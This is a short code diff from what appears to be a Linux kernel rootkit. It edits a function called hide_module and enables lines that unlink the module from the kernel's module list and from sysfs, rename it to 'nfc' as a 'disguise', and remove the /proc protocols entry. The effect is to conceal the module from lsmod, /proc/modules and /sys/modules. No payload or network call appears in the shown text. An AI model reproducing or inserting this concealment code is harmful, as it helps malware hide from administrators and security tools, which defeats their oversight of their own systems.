@@ -616,8 +616,8 @@ void hide_module(void) {
     }    */
 
 #ifdef MODULE
-    // module_previous = THIS_MODULE->list.prev;
-    // module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
+     module_previous = THIS_MODULE->list.prev;
+     module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
     //
     list_del(&THIS_MODULE->list); // lsmod,/proc/modules
     kobject_del(&THIS_MODULE->mkobj.kobj); // /sys/modules
@@ -627,7 +627,7 @@ void hide_module(void) {
 
     // protocol disguise! A lie
     memcpy(THIS_MODULE->name, "nfc\0", 4);
-    // remove_proc_entry("protocols", net->proc_net);
+     remove_proc_entry("protocols", net->proc_net);
 #endif
 }
 
